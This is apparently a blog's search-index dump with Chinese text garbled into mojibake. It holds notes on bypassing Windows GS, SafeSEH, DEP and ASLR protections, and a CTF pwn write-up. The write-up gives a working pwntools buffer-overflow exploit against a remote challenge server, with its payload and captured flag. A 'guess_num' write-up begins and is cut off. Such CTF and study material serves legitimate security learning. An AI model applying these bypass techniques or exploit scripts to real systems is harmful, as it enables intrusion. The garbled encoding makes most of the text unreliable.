GSå®‰å…¨ç¼–è¯‘é€‰é¡¹ä¿æŠ¤ä»‹ç»åœ¨æ‰€æœ‰å‡½æ•°è°ƒç”¨å‘ç”Ÿæ—¶ï¼ŒGSç¼–è¯‘é€‰é¡¹ä¼šå‘æ ˆå¸§å†…å‹å…¥ä¸€ä¸ªé¢å¤–çš„éšæœºDWORD,è¿™ä¸ªéšæœºæ•°è¢«ç§°ä¸ºcanaryï¼Œåœ¨EBPå‰ï¼Œç³»ç»Ÿåœ¨.dataå†…å­˜åŒºå­˜æ”¾äº†canaryå‰¯æœ¬ï¼Œå‡½æ•°è¿”å›å‰ç³»ç»Ÿä¼šæ‰§è¡Œå®‰å…¨éªŒè¯æ“ä½œï¼Œæ¯”è¾ƒæ ˆå¸§ä¸­canaryä¸å†…å­˜åŒºå‰¯æœ¬æ˜¯å¦ä¸€è‡´ï¼Œä¸ä¸€è‡´åˆ™è¯æ˜å‘ç”Ÿæº¢å‡ºï¼Œç³»ç»Ÿå°†è¿›è¡Œå¼‚å¸¸å¤„ç†ã€‚ ä»¥ä¸‹æƒ…å†µä¸ä¼šåº”ç”¨GS å‡½æ•°ä¸åŒ…å«ç¼“å†²åŒº å‡½æ•°è¢«å®šä¹‰ä¸ºå…·æœ‰å˜é‡å‚æ•°åˆ—è¡¨ å‡½æ•°ä½¿ç”¨æ— ä¿æŠ¤çš„å…³é”®å­—æ ‡è®° å‡½æ•°åœ¨ç¬¬ä¸€ä¸ªè¯­å¥ä¸­åŒ…å«å†…åµŒæ±‡ç¼–ä»£ç  ç¼“å†²åŒºä¸æ˜¯8å­—èŠ‚ç±»å‹ä¸”å¤§å°ä¸å¤§äº4ä¸ªå­—èŠ‚ã€‚ å…¸å‹çªç ´GSçš„æ–¹æ³•åˆ©ç”¨æœªä¿æŠ¤çš„å†…å­˜ä¸ºäº†å°†GSå¯¹æ€§èƒ½çš„å½±å“é™åˆ°æœ€å°ï¼Œå¹¶ä¸ä¼šæ‰€æœ‰çš„å‡½æ•°éƒ½ä¼šè¢«ä¿æŠ¤ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€äº›æœªè¢«ä¿æŠ¤çš„å‡½æ•°ç»•è¿‡GSä¿æŠ¤ã€‚ ä¾‹å­ï¼šå‡½æ•°ä¸­ä¸åŒ…å«4å­—èŠ‚ä»¥ä¸Šçš„ç¼“å†²åŒºï¼Œä¸å—åˆ°GSä¿æŠ¤ï¼Œå‡½æ•°è¿”å›å‰æœªè¿›è¡Œä»»ä½•å®‰å…¨æ£€æµ‹ï¼Œå¯ä»¥è¦†ç›–è¿”å›åœ°å€ã€‚ mov esp,ebp pop ebp retn``` ### è¦†ç›–è™šå‡½æ•° ç¨‹åºåªæœ‰åœ¨å‡½æ•°è¿”å›æ—¶æ‰ä¼šcheckï¼Œè€Œåœ¨æ­¤ä¹‹å‰æ²¡æœ‰ä»»ä½•æ£€æŸ¥æªæ–½ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç¨‹åºæ£€æŸ¥cookieä¹‹å‰åŠ«æŒç¨‹åºæµç¨‹ï¼Œå®ç°æº¢å‡ºã€‚ &gt; ä¾‹å­ï¼šåˆ©ç”¨C++çš„è™šå‡½æ•°æ¥ç»•è¿‡GSæœºåˆ¶ã€‚ &gt;&gt; å½“å‡½æ•°ä¸­å­˜åœ¨æº¢å‡ºï¼Œå¯èƒ½ä¼šå½±å“åˆ°è™šè¡¨æŒ‡é’ˆï¼Œç»§è€Œå¯ä»¥æ§åˆ¶è™šè¡¨æŒ‡é’ˆä½¿å…¶æŒ‡å‘æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å†…å­˜ç©ºé—´ã€‚ &gt; è™šå‡½æ•°å®ç°è¿‡ç¨‹ï¼šç¨‹åºæ ¹æ®è™šè¡¨æŒ‡é’ˆæ‰¾åˆ°è™šè¡¨ï¼Œç„¶åä»è™šè¡¨ä¸­å–å‡ºè¦è°ƒç”¨çš„è™šå‡½æ•°åœ°å€ï¼Œæ ¹æ®åœ°å€è½¬å…¥è™šå‡½æ•°æ‰§è¡Œã€‚ ### æ”»å‡»å¼‚å¸¸å¤„ç† GSå¯¹S.E.Hæ²¡æœ‰æä¾›ä¿æŠ¤ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡æ”»å‡»å¼‚å¸¸å¤„ç†ç»•è¿‡GS. é€šè¿‡è¶…é•¿å­—ç¬¦ä¸²è¦†ç›–æ‰å¼‚å¸¸å¤„ç†å‡½æ•°æŒ‡é’ˆï¼Œæƒ³åŠæ³•è§¦å‘ä¸€ä¸ªå¼‚å¸¸ï¼Œç¨‹åºå°±ä¼šè½¬å…¥å¼‚å¸¸å¤„ç†ï¼Œç”±äºå¼‚å¸¸å¤„ç†å‡½æ•°æŒ‡é’ˆå·²ç»è¢«è¦†ç›–ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡åŠ«æŒS.E.Hæ¥æ§åˆ¶ç¨‹åºçš„åç»­æµç¨‹ã€‚ ### åŒæ—¶æ›¿æ¢æ ˆä¸­å’Œ.dataä¸­çš„Cookie cookieçš„ç”Ÿæˆå…·æœ‰å¾ˆå¼ºçš„éšæœºæ€§ï¼Œå› ä¸ºæ‰å‡ºæ¥åŸºæœ¬ä¸å¯èƒ½ã€‚åŒæ—¶æ›¿æ¢æ ˆä¸­å’Œ.dataä¸­çš„cookieä¿è¯æº¢å‡ºåçš„ä¸€è‡´æ€§ã€‚ &gt; ä¾‹å­ï¼šå°†shellcodeèµ‹å€¼ä¸º8ä¸ª0x90,ODè¿è¡Œæ–­åœ¨testå‡½æ•°çš„ifè¯­å¥å¤„ï¼Œä»if_addrå–å‡ºcookieï¼Œä¸ebpå¼‚æˆ–åæ”¾å…¥ebp-4çš„ä½ç½®å»ã€‚ï¼ˆå‡½æ•°è¿”å›å‰çš„æ ¡éªŒè¿‡ç¨‹ï¼šç¨‹åºä»ebp-4çš„ä½ç½®å–å‡ºcookie,ä¸ebpå¼‚æˆ–åä¸if_addrå¤„cookieæ¯”è¾ƒä¸€è‡´æ€§ï¼‰ï¼Œå¦‚æ­¤.dataä¸­cookieæˆåŠŸä¿®æ”¹ä¸º0x90. &gt; æ¥ä¸‹æ¥æ§åˆ¶æ ˆä¸­cookieï¼Œé€šè¿‡è¶…é•¿å­—ç¬¦ä¸²è¦†ç›–å˜é‡ï¼Œä¿®æ”¹cookieã€‚ &gt; å¸ƒç½®shellcode:é¦–å…ˆæ”¾4ä¸ª0x90ç”¨äºä¿®æ”¹if_addrï¼Œç„¶åè·Ÿç€å¼¹å‡ºâ€œfailwestâ€çš„æœºå™¨ç ï¼Œç„¶åç”¨0x90å¡«å……è‡³cookieçš„ä½ç½®ï¼Œæ¥ä¸‹æ¥è·Ÿç€90909090ä¸å½“å‰ebpå¼‚æˆ–çš„ç»“æœï¼Œæœ€åå†åŠ ä¸Š4ä¸ªå­—èŠ‚çš„å¡«å……å’Œshellcodeèµ·å§‹åœ°å€(ç”¨æ¥è¦†ç›–å‡½æ•°è¿”å›åœ°å€) # 0x03 SafeSEHï¼šå¯¹å¼‚å¸¸å¤„ç†çš„ä¿æŠ¤æœºåˆ¶ åœ¨ç¨‹åºè°ƒç”¨å¼‚å¸¸å¤„ç†å‡½æ•°å‰ï¼Œå¯¹è¦è°ƒç”¨çš„å¼‚å¸¸å¤„ç†å‡½æ•°è¿›è¡Œæ ¡éªŒï¼Œå½“å‘ç°å‡½æ•°ä¸å¯é å°†ç»ˆæ­¢å¼‚å¸¸å¤„ç†å‡½æ•°çš„è°ƒç”¨ã€‚ ## æ ¡éªŒæµç¨‹ å¼‚å¸¸å¤„ç†å‡½æ•°çš„è°ƒç”¨æ˜¯é€šè¿‡RtlDispatchException()å‡½æ•°å¤„ç†å®ç°ï¼ŒSafeSEHæœºåˆ¶ä¹Ÿæ˜¯ä»æ­¤å¤„å¼€å§‹ã€‚å…¶æ ¡éªŒæµç¨‹å¦‚ä¸‹ï¼š * æ£€æŸ¥å¼‚å¸¸å¤„ç†é“¾æ˜¯å¦ä½äºå½“å‰ç¨‹åºçš„æ ˆä¸­ * å¼‚å¸¸å¤„ç†æŒ‡é’ˆæ˜¯å¦æŒ‡å‘å½“å‰ç¨‹åºæ ˆä¸­ * è°ƒç”¨å‡½æ•°RtlIsVaildHandler()å¯¹å¼‚å¸¸å¤„ç†å‡½æ•°è¿›è¡Œæ ¡éªŒ * å¼‚å¸¸å¤„ç†å‡½æ•°åœ°å€æ˜¯å¦åœ¨åŠ è½½æ¨¡å—çš„å†…å­˜ç©ºé—´ * åˆ¤æ–­ç¨‹åºæ˜¯å¦è®¾ç½®äº†IMAGE_DLLCHARACTERISTICS_NO_SEHæ ‡è¯†ï¼ˆæ ‡è¯†è¢«è®¾ç½®ï¼Œå‡½æ•°è¿”å›æ ¡éªŒå¤±è´¥ï¼‰ * ç¨‹åºä¸­æ˜¯å¦åŒ…å«å®‰å…¨S.E.Hè¡¨ï¼Œå°†å¼‚å¸¸å¤„ç†å‡½æ•°åœ°å€ä¸è¯¥è¡¨åŒ¹é…ï¼ŒæˆåŠŸåˆ™ç»§ç»­ * åˆ¤æ–­æ˜¯å¦è®¾ç½®ILonlyæ ‡è¯†ã€‚ï¼ˆè®¾ç½®æ­¤æ ‡è¯†ï¼Œè¯æ˜è¯¥ç¨‹åºåªåŒ…å«.NETç¼–è¯‘äººä¸­é—´è¯­è¨€ï¼Œæ ¡éªŒå¤±è´¥ï¼‰ * åˆ¤æ–­å¼‚å¸¸å¤„ç†å‡½æ•°åœ°å€æ˜¯å¦ä½äºä¸å¯æ‰§è¡Œé¡µä¸Šï¼Œä½äºï¼Œåˆ™æ£€æµ‹DEPæ˜¯å¦å¼€å¯ï¼Œæœªå¼€å¯åˆ™æ ¡éªŒæˆåŠŸ * åˆ¤æ–­ç³»ç»Ÿæ˜¯å¦å…è®¸è·³è½¬åˆ°åŠ è½½æ¨¡å—çš„å†…å­˜ç©ºé—´å¤–æ‰§è¡Œï¼Œå…è®¸åˆ™è¿”å›æˆåŠŸ &gt; RtlIsVaildHandler()å…è®¸å¼‚å¸¸å¤„ç†å‡½æ•°æ‰§è¡Œçš„æƒ…å†µï¼š &gt;&gt; å¼‚å¸¸å¤„ç†å‡½æ•°ä½äºåŠ è½½æ¨¡å—å†…å­˜èŒƒå›´ä¹‹å¤–ï¼ŒDEPå…³é—­ &gt;&gt; å¼‚å¸¸å¤„ç†å‡½æ•°ä½äºåŠ è½½æ¨¡å—å†…å­˜èŒƒå›´ä¹‹å†…ï¼Œç›¸åº”æ¨¡å—æœªå¯ç”¨SafeSEHï¼Œä¸”æ¨¡å—ä¸æ˜¯çº¯ILï¼ˆä¸­é—´è¯­è¨€ï¼‰. &gt;&gt; å¼‚å¸¸å¤„ç†å‡½æ•°ä½äºåŠ è½½æ¨¡å—å†…å­˜èŒƒå›´ä¹‹å†…ï¼Œç›¸åº”æ¨¡å—æœªå¯ç”¨SafeSEHï¼Œå¼‚å¸¸å¤„ç†å‡½æ•°åœ°å€åŒ…å«åœ¨å®‰å…¨SEHè¡¨ä¸­ã€‚ ## ç»•è¿‡SafeSEHï¼ˆä¸è€ƒè™‘DEPå½±å“ï¼‰ * æ”»å‡»è¿”å›åœ°å€ç»•è¿‡ã€‚ * ä¸€ä¸ªç¨‹åºå¯ç”¨äº†SafeSEHä½†æ˜¯æœªå¯ç”¨GS(æˆ–è¢«æ”»å‡»å‡½æ•°ä¸å—åˆ°GSä¿æŠ¤)ï¼Œæ”»å‡»å‡½æ•°è¿”å›åœ°å€ * åˆ©ç”¨è™šå‡½æ•°ç»•è¿‡ * ä»å †ä¸­ç»•è¿‡ * åˆ©ç”¨æœªå¯ç”¨SafeSEHæ¨¡å—ç»•è¿‡ * åˆ©ç”¨åŠ è½½æ¨¡å—ä¹‹å¤–çš„åœ°å€ç»•è¿‡SafeSEH * # 0x04 DEP ## ä»‹ç» æº¢å‡ºæ”»å‡»çš„æ ¹æºåœ¨äºç°ä»£è®¡ç®—æœºå¯¹æ•°æ®å’Œä»£ç æ²¡æœ‰æ˜ç¡®åŒºåˆ†è¿™ä¸€å…ˆå¤©ç¼ºé™·ï¼ŒDEP(æ•°æ®æ‰§è¡Œä¿æŠ¤)å°±æ˜¯ç”¨æ¥å¼¥è¡¥è®¡ç®—æœºå¯¹æ•°æ®å’Œä»£ç æ··æ·†è¿™ä¸€å¤©ç„¶ç¼ºé™·ã€‚ DEPåŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚ DEPä¸»è¦ä½œç”¨æ˜¯é˜»æ­¢æ•°æ®é¡µæ‰§è¡Œä»£ç ï¼Œåˆ†ä¸ºè½¯ä»¶DEPå’Œç¡¬ä»¶DEP. è½¯ä»¶DEPå³SafeSEHï¼Œä¸CPUç¡¬ä»¶æ— å…³ã€‚ ç¡¬ä»¶DEPæ˜¯ç”±Windowsåˆ©ç”¨è½¯ä»¶æ¨¡æ‹Ÿå®ç°ï¼Œå¯¹æ“ä½œç³»ç»Ÿæä¾›ä¸€å®šçš„ä¿æŠ¤ã€‚ï¼ˆç¡¬ä»¶DEPæ‰æ˜¯çœŸæ­£çš„DEP,éœ€è¦CPUæ”¯æŒï¼ŒAMDç§°ä¹‹ä¸ºNXï¼ŒIntelç§°ä¹‹ä¸ºXDï¼‰ ## æ”»å‡»DEPæ–¹æ³• ### æ”»å‡»æœªå¯ç”¨DEPç¨‹åº ### åˆ©ç”¨Ret2LibcæŒ‘æˆ˜DEP ret2libcæ˜¯return-to-libcçš„ç¼©å†™ï¼Œç”±äºDEPä¸å…è®¸æˆ‘ä»¬ç›´æ¥åˆ°éå¯æ‰§è¡Œä¹Ÿæ‰§è¡ŒæŒ‡ä»¤ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å…¶ä»–å¯æ‰§è¡Œçš„ä½ç½®æ‰¾åˆ°ç¬¦åˆæˆ‘ä»¬è¦æ±‚çš„æŒ‡ä»¤ï¼Œè®©è¿™æ¡æŒ‡ä»¤æ›¿æˆ‘ä»¬å·¥ä½œï¼Œä¸ºäº†æ§åˆ¶æ­¤æ¡æŒ‡ä»¤ï¼Œåœ¨æŒ‡ä»¤æ‰§è¡Œåè¿˜éœ€è¦ä¸€ä¸ªè¿”å›æŒ‡ä»¤ï¼Œä»¥ä¾¿å›æ”¶ç¨‹åºçš„æ§åˆ¶æƒã€‚ #### ä¸‰ç§ç›¸å¯¹æœ‰æ•ˆçš„ç»•è¿‡DEPçš„exploitæ–¹æ³• * é€šè¿‡è·³è½¬åˆ°ZwSetInformationProcesså‡½æ•°å°†DEPå…³é—­åå†è½¬å…¥shellcodeæ‰§è¡Œ * é€šè¿‡è·³è½¬åˆ°VirtualProtectå‡½æ•°æ¥å°†shellcodeæ‰€åœ¨å†…å­˜é¡µè®¾ç½®ä¸ºå¯æ‰§è¡ŒçŠ¶æ€ï¼Œç„¶ååœ¨è½¬å…¥shellcodeæ‰§è¡Œ * é€šè¿‡è·³è½¬åˆ°VIrtualAllocå‡½æ•°å¼€è¾Ÿä¸€æ®µå…·æœ‰æ‰§è¡Œæƒé™çš„å†…å­˜ç©ºé—´å»ºï¼Œç„¶åå°†shellcodeå¤åˆ¶åˆ°è¿™æ®µå†…å­˜ä¸­æ‰§è¡Œ ### åˆ©ç”¨å¯æ‰§è¡Œå†…å­˜æŒ‘æˆ˜DEP æœ‰æ—¶å€™åœ¨è¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­ä¼šå­˜åœ¨ä¸€æ®µå¯è¯»å¯å†™å¯æ‰§è¡Œçš„å†…å­˜ï¼Œå¦‚æœèƒ½å¤Ÿå°†shellcodeå¤åˆ¶åˆ°è¿™æ®µå†…å­˜ä¸­ï¼Œå¹¶åŠ«æŒç¨‹åºæµç¨‹ï¼Œæˆ‘ä»¬çš„shellcodeå°±æœ‰æ‰§è¡Œçš„æœºä¼šã€‚æ­¤å¤„éœ€è¦ä¸€äº›è¿æ°”ï¼Œç„¶è€Œæˆ‘åœ¨åšå®éªŒä¸Šä¸€å‘è¿æ°”å¾ˆå·®â€¦â€¦,å¦‚æœè¢«æ”»å‡»çš„ç¨‹åºå†…å­˜ç©ºé—´ä¸­å­˜åœ¨è¿™æ ·ä¸€ä¸ªå¯æ‰§è¡Œçš„æ•°æ®åŒºåŸŸï¼Œå°±å¯ä»¥ç›´æ¥é€šè¿‡memcpyå‡½æ•°å°†shellcodeå¤åˆ¶åˆ°è¿™æ®µå†…å­˜åŒºåŸŸä¸­æ‰§è¡Œã€‚ ### åˆ©ç”¨.NETæŒ‘æˆ˜DEP .NETçš„æ–‡ä»¶å…·æœ‰å’ŒPEæ–‡ä»¶ä¸€æ ·çš„ç»“æ„ï¼Œå³ä¹Ÿå…·æœ‰.textç­‰æ®µï¼Œè¿™äº›æ®µä¼šè¢«æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œä¹Ÿä¼šå…·æœ‰ä¸€å®šçš„å¯æ‰§è¡Œå±æ€§ã€‚å°†shellcodeæ”¾åˆ°.NETä¸­å…·æœ‰å¯æ‰§è¡Œå±æ€§çš„æ®µä¸­ï¼Œç„¶åè®©ç¨‹åºè½¬å…¥è¿™ä¸ªåŒºåŸŸæ‰§è¡Œï¼Œå°±å¯ä»¥æ‰§è¡Œshellcodeäº†ã€‚ ### åˆ©ç”¨java appletæŒ‘æˆ˜DEP java appletä¸.NETç±»ä¼¼ï¼Œéƒ½å¯ä»¥è¢«IEæµè§ˆå™¨åŠ è½½åˆ°å®¢æˆ·ç«¯ï¼Œè€Œä¸”åŠ è½½åˆ°IEè¿›ç¨‹çš„å†…å­˜ç©ºé—´åè¿™äº›æ§ä»¶æ‰€åœ¨å†…å­˜ç©ºé—´éƒ½å…·æœ‰å¯æ‰§è¡Œå±æ€§ã€‚ # 0x05 ASLR ## ä»‹ç» ASLR,é€šè¿‡åŠ è½½ç¨‹åºçš„æ—¶å€™ä¸å†ä½¿ç”¨å›ºå®šçš„åŸºå€åŠ è½½ï¼Œä»è€Œå¹²æ‰°shellcodeå®šä½çš„ä¸€ç§ä¿æŠ¤æœºåˆ¶ã€‚åŒ…å«äº†æ˜ åƒéšæœºåŒ–ã€å †æ ˆéšæœºåŒ–ã€PEBä¸TEBéšæœºåŒ–ã€‚ ï¼ˆæ”¯æŒASLRçš„ç¨‹åºåœ¨å®ƒçš„PEå¤´ä¸­ä¼šè®¾ç½®IMAGE_DLL_CHARACTERISITCS_DYNAMIC_BASEæ ‡è¯†æ¥è¯´æ˜ï¼Œç¼–è¯‘ç¨‹åºæ—¶å¯ç”¨/dynmicbaseé“¾æ¥é€‰é¡¹å°±å¯ä»¥æ”¯æŒASLRäº†ï¼‰ ### æ˜ åƒéšæœºåŒ– åœ¨PEæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œå¯¹å…¶åŠ è½½çš„è™šæ‹Ÿåœ°å€è¿›è¡ŒéšæœºåŒ–å¤„ç†ï¼Œè¿™ä¸ªåœ°å€æ˜¯åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ç¡®å®šçš„ï¼Œç³»ç»Ÿé‡å¯çº¢è—•è¿™ä¸ªåœ°å€ä¼šå˜åŒ–ã€‚ æ˜ åƒéšæœºåŒ–åªå¯¹åŠ è½½åŸºå€çš„å‰2ä¸ªå­—èŠ‚åšäº†éšæœºå¤„ç†ã€‚ ### å †æ ˆéšæœºåŒ– åœ¨ç¨‹åºè¿è¡Œæ—¶éšæœºçš„é€‰æ‹©å †æ ˆåŸºå€ï¼Œå †æ ˆåŸºå€åœ¨æ‰“å¼€ç¨‹åºçš„æ—¶å€™ç¡®å®šã€‚ ### PEBå’ŒTEBéšæœºåŒ– TEBå­˜æ”¾åœ¨FS:0å’ŒFS:[0x18]å¤„ï¼ŒPEBå­˜æ”¾åœ¨TEBåç§»0x30çš„ä½ç½®ã€‚ ## æ”»å‡»æ–¹å¼ ### æ”»å‡»æœªå¯ç”¨ASLRæ¨¡å— ASLRä»…ä»…æ˜¯å®‰å…¨æœºåˆ¶ï¼Œä¸æ”¯æŒASLRçš„è½¯ä»¶å¾ˆå¤šï¼Œè¿™æ„å‘³ç€åŠ è½½åŸºå€å›ºå®šï¼Œåœ¨å½“å‰è¿›ç¨‹æ‰¾åˆ°è¿™æ ·çš„æ¨¡å—å°±å¯ä»¥åˆ©ç”¨å®ƒé‡Œé¢çš„æŒ‡ä»¤ä½œä¸ºè·³æ¿ç›´æ¥æ— è§†ASLR. å¦‚ï¼šAdobe Flash Player ActiveX ### åˆ©ç”¨éƒ¨åˆ†è¦†ç›–è¿›è¡Œå®šä½å†…å­˜åœ°å€ ä¹‹å‰è¯´è¿‡ï¼Œæ˜ åƒéšæœºåŒ–åªæ˜¯å¯¹æ˜ åƒåŠ è½½åŸºå€çš„å‰2ä¸ªå­—èŠ‚åšéšæœºåŒ–å¤„ç†ï¼Œæˆ‘ä»¬å¯è¦†ç›–è¿™ä¸ªåœ°å€çš„æœ€åå‡ ä¸ªå›ºå®šå­—èŠ‚ï¼Œå°±å¯ä»¥åœ¨ä¸€å®šèŒƒå›´å†…æ§åˆ¶ç¨‹åºã€‚ é‡‡ç”¨è¿™ç§ç±»ä¼¼ç›¸å¯¹å¯»å€æ–¹æ³•æ¥åŠ¨æ€ç¡®å®šè·³æ¿æŒ‡ä»¤çš„åœ°å€ä»¥å®ç°è°ƒç­æŒ‡ä»¤çš„é€šç”¨æ€§ã€‚ ### åˆ©ç”¨Heap sprayæŠ€æœ¯å®šä½å†…å­˜åœ°å€ Heap sprayåŸç†ï¼šé€šè¿‡ç”³è¯·å¤§é‡çš„å†…å­˜ï¼Œå é¢†å†…å­˜ä¸­çš„0x0C0C0C0Cçš„ä½ç½®ï¼Œå¹¶åœ¨è¿™äº›å†…å­˜ä¸­æ”¾ç½®0x90å’Œshellcodeï¼Œæœ€åæ§åˆ¶ç¨‹åºè½¬å…¥0x0C0C0C0Cæ‰§è¡Œã€‚ ### åˆ©ç”¨Java applet heap sprayæŠ€æœ¯å®šä½å†…å­˜åœ°å€ ### ä¸º.NETæ§ä»¶ç¦ç”¨ASLR","categories":[],"tags":[{"name":"æ¼æ´","slug":"æ¼æ´","permalink":"https://sinky.top/tags/%E6%BC%8F%E6%B4%9E/"}]},{"title":"æ”»é˜²ä¸–ç•Œ int_overflow","slug":"æ”»é˜²ä¸–ç•Œpwn-int_overflow","date":"2022-08-09T03:17:04.192Z","updated":"2022-08-11T14:23:43.216Z","comments":true,"path":"2022/08/09/æ”»é˜²ä¸–ç•Œpwn-int_overflow/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/","excerpt":"","text":"checksec æŸ¥çœ‹ä¿æŠ¤æœºåˆ¶ å¯ç›´æ¥ä½¿ç”¨æ ˆæº¢å‡ºï¼›åŸºåœ°å€ä¸å˜åŒ–ï¼›æ ˆä¸­æ•°æ®æœ‰æ‰§è¡Œæƒé™ï¼› åˆ†ææ€è·¯32ä½æ–‡ä»¶ï¼ŒæŒ‰æµç¨‹æŸ¥çœ‹ç¨‹åºï¼Œmain()æ— çªç ´ç‚¹ã€‚ è¿›å…¥login(),é™åˆ¶usernameé•¿åº¦æœ€å¤§0x19;é™åˆ¶passwdé•¿åº¦æœ€å¤§0x199ï¼› è¿›å…¥check_passwd()ï¼Œv3å­˜å‚¨passwdé•¿åº¦ï¼Œæ»¡è¶³ifè¯­å¥3&lt;v3&lt;=8å¯è·³åˆ°elseè¯­å¥ã€‚ æ­¤å¤„æœ‰çªç ´ç‚¹ï¼šv3ç±»å‹ä¸ºunsigned __int8,ï¼Œå–å€¼èŒƒå›´0~255ï¼Œè€Œv3å­˜å‚¨çš„passwdæœ€å¤§ä¸º0x199,å³409.è¿œå¤§äºv3å–å€¼èŒƒå›´ã€‚æ­¤å¤„ä¸ºå…¸å‹æ•´æ•°æº¢å‡ºã€‚ ç»¼ä¸Š:ifè¯­å¥ä¸­çš„v3èŒƒå›´ä¸ºï¼ˆ3,8]æˆ–[259,264] ï¼ˆæœ€å¤§ä¸º255ï¼Œè‹¥ä½¿å…¶æº¢å‡ºï¼Œåˆ™éœ€å†åŠ å››å­—èŠ‚ï¼Œ__int8 æ˜¯æŒ‡8bitï¼‰ æº¢å‡ºä¹‹ååˆ°è¾¾elseè¯­å¥ï¼Œå‡½æ•°è¿”å› strcpy(dest,s)ï¼Œdestä¸ºå­—ç¬¦ä¸²æ‹·è´ç›®çš„æ ˆï¼Œé•¿åº¦ä¸º0x14ã€‚ åœ¨å­—ç¬¦ä¸²ä¸­å‘ç°cat flag,å±äºå‡½æ•° what_is_this()ï¼Œåœ°å€ä¸º0x0804868B. æ”»å‡»æ€è·¯å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºï¼Œä»¤passwdç›´æ¥è¦†ç›–dest,ç›´æ¥ä½¿å‡½æ•°è¿”å›what_is_this()ã€‚ åœ¨å­—ç¬¦æ‹·è´è¿‡ç¨‹ä¸­ï¼Œè¾“å…¥0x14ä¸ªå­—ç¬¦ï¼Œå¯è¦†ç›–å‡½æ•°è¿”å›åœ°å€ï¼Œå…·ä½“æ˜¯å¦ä¸º0x14ä¸ªå­—ç¬¦ï¼Œç°åœ¨æŸ¥çœ‹æ±‡ç¼–è¯­è¨€ï¼š åœ¨å­—ç¬¦ä¸²æ‹·è´å‰ï¼Œå…ˆå°†æ‹·è´åŸåœ°å€å’Œç›®çš„åœ°å€å‹å…¥å †æ ˆï¼Œåœ¨å‡½æ•°æœ€å¼€å§‹å‹å…¥ebpå˜é‡ï¼Œåœ¨å‡½æ•°ç»“å°¾å­˜åœ¨leaveæŒ‡ä»¤ï¼Œåœ¨32ä½ç¨‹åºä¸­ï¼ŒleaveæŒ‡ä»¤ç­‰äºmov esp,ebpå’Œpop ebpã€‚å³ï¼šåœ¨è¦†ç›–å‡½æ•°è¿”å›åœ°å€å‰ï¼Œè¿˜æœ‰ä¸€æ¬¡å‡ºæ ˆæ“ä½œï¼Œæ•°å€¼4å­—èŠ‚ã€‚å³è¦†ç›–ä¹‹å‰è¿˜éœ€å°†è¿™4å­—èŠ‚è¦†ç›–ã€‚éšæœºé€‰å–æ•°å€¼262.ï¼ˆwhat_is_this()å‡½æ•°çš„åœ°å€ä¸º4å­—èŠ‚ï¼‰ 262-0x14-4-4=234 æˆ–è€…ï¼Œæˆ‘åœ¨gdbä¸­è°ƒè¯•ç¨‹åºï¼Œåœ¨strcpyä¸‹æ–­ç‚¹ï¼Œpasswdå¡«ä¸Šâ€˜aâ€™*262ï¼Œè§‚å¯Ÿåˆ°ebpå€¼ä¸º4å­—èŠ‚ã€‚ exp: 1234567891011from pwn import*sh=remote('111.198.29.45',39118)sh.recvuntil('Your choice:')flag=0x0804868Bsh.sendline('1')sh.recvuntil('username:')sh.sendline('z')sh.recvuntil('passwd:')payload='a'*0x14+'aaaa'+p32(flag)+'a'*234sh.sendline(payload)sh.interactive() cyberpeace{2a2d92a084e034be9c3a03bbab4f149b}","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"}]},{"title":"æ”»é˜²ä¸–ç•Œ guess_num","slug":"æ”»é˜²ä¸–ç•Œpwn-guess_num","date":"2022-08-09T03:17:04.190Z","updated":"2022-08-11T14:23:36.259Z","comments":true,"path":"2022/08/09/æ”»é˜²ä¸–ç•Œpwn-guess_num/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/","excerpt":"","text":"æŸ¥çœ‹å…³é”®main()å‡½æ•°ï¼Œå‘ç°gets(&amp;v11)å­˜åœ¨æ ˆæº¢å‡º è¿›å…¥sub_C3E()å‡½æ•°ï¼Œç¡®å®šæ»¡è¶³æ¡ä»¶å³å¯cat flagã€‚ é¢˜ç›®è¦æ±‚ï¼Œå…ˆè¾“å…¥name,ç„¶åè¿ç»­åæ¬¡çŒœå¯¹æ•°å­—å¾—åˆ°flag, è¿›å…¥V11,åœ¨æ ˆä¸­å 0x20ï¼Œå¯ä»¥è¦†ç›–åˆ°seedï¼Œä½¿seed[0]å·²çŸ¥ï¼Œåä½¿è¾“å…¥çš„v8ç­‰äºéšæœºæ•°v10,æ‹¿åˆ°flagã€‚ æ³¨ï¼šï¼ˆ1ï¼‰åœ¨è°ƒç”¨rang()æ—¶ï¼Œå…ˆåˆ©ç”¨srand()è®¾å¥½éšæœºæ•°ç§å­ï¼Œè‹¥æœªè®¾ç½®ï¼Œrand()åœ¨è°ƒç”¨çš„æ—¶å€™ä¼šè‡ªåŠ¨è®¾ä¸º1.ï¼ˆ2ï¼‰libcå…±äº«åº“ï¼šå¯ä»¥ä½¿ç”¨å‘½ä»¤ ldd guess_num 